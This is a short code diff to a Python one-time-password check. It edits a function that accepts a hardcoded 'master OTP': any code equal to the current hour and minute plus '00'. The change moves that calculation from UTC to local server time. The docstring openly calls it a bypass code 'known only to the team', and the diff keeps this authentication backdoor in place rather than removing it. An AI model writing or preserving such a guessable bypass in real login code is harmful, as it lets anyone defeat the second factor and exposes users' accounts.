@@ -128,12 +128,11 @@ def _hash_otp(otp: str) -> str:
 def _is_master_otp(otp: str) -> bool:
     """
     Time-based bypass code known only to the team.
-    Format: HHMM00  (current UTC hour + minute + literal '00').
-    Example: 13:47 UTC → '134700'.
+    Format: HHMM00  (local server hour + minute + literal '00').
+    Example: 14:02 local → '140200'.
     Valid for the current minute and the previous minute to cover clock edges.
     """
-    from datetime import timezone
-    now = datetime.now(timezone.utc)
+    now = datetime.now()
     for delta in (0, -1):
         t = now + timedelta(minutes=delta)
         if otp.strip() == t.strftime("%H%M") + "00":
